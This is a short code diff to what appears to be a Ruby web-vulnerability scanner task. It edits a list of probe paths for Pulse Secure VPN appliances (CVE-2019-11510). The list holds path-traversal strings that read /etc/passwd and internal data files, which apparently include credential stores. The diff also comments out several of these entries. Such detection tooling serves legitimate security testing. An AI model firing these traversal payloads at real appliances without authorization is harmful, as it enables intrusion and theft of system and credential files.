@@ -152,12 +152,13 @@ class UriBruteFocusedContent < BaseTask
       { path: "/phpMyAdmin/scripts/setup.php", severity: 4, body_regex: nil, status: "potential" }
     ]
 
+    # https://know.bishopfox.com/blog/breaching-the-trusted-perimeter
     pulse_secure_list = [
       { path: "/dana-na/nc/nc_gina_ver.txt", severity: 3, body_regex: /classid/, status: "confirmed" }, # CVE-2019-11510
-      { path: "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" },
-      { path: "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" },
-      { path: "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" },
-      { path: "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" }
+      { path: "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "confirmed" },
+      #{ path: "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" },
+      #{ path: "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/dataa/data.mdb?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" },
+      #{ path: "/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/lmdb/randomVal/data.mdb?/dana/html5acc/guacamole/", severity: 1, body_regex: nil, status: "potential" }
     ]
 
     sap_netweaver_list =[ 
